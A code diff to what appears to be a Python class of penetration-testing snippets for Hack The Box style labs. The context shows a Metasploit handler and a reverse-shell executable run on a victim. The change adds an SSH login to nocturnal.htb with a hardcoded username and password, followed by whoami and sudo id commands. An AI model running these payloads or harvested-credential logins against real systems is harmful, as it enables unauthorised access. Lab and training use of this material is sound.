@@ -103,7 +103,18 @@ msf6 exploit(multi/handler) > run
 # On victim (e.g. Evil-WinRM):
 PS C:\\Users\\user\\Downloads> ./shell.exe
 '''
-        }
+        },
+        "ssh_exec": {
+            "desc": "SSH command execution and output capture",
+            "code": '''\
+# SSH exec example: run a command and capture output
+tokuproxy = ssh("nocturnal.htb", 22, username="tobias", password="slowmotionapocalypse")
+out = tokuproxy.exec("whoami")
+print("Remote user:", out)
+# Optionally, run with sudo
+out = tokuproxy.exec("id", sudo=True)
+print("Remote id (sudo):", out)
+'''
     }
 
     @classmethod
@@ -139,3 +150,6 @@ PS C:\\Users\\user\\Downloads> ./shell.exe
     @classmethod
     def msfvenom(cls):
         print(cls._examples["msfvenom"]["code"])
+    @classmethod
+    def ssh_exec(cls):
+        print(cls._examples["ssh_exec"]["code"])
